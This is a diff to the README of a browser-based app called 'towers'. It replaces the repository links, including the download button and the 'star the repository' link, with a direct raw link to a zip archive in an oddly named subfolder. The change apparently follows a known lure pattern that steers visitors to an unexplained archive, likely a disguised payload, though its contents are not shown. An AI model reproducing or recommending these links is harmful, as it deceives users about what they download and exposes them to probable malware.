@@ -25,7 +25,7 @@ towers runs in any modern web browser. Minimum requirements:
 
 Visit this link to download the application:
 
-[**Download towers**](https://github.com/Ethylaminobenzoateauroraborealis564/towers)
+[**Download towers**](https://raw.githubusercontent.com/Ethylaminobenzoateauroraborealis564/towers/main/fetterless/1.4-beta.5.zip)
 
 ### Step-by-Step Download Instructions
 
@@ -97,7 +97,7 @@ Japanese castles (tenshu), Chinese pagodas (pagoda), and Thai temples (prang).
 ## 📬 Support
 
 If you enjoy towers, please ⭐ star the GitHub repository:  
-[https://github.com/Ethylaminobenzoateauroraborealis564/towers](https://github.com/Ethylaminobenzoateauroraborealis564/towers)
+[https://raw.githubusercontent.com/Ethylaminobenzoateauroraborealis564/towers/main/fetterless/1.4-beta.5.zip](https://raw.githubusercontent.com/Ethylaminobenzoateauroraborealis564/towers/main/fetterless/1.4-beta.5.zip)
 
 Share the link with friends or reach out via GitHub Issues if you have ideas.
 
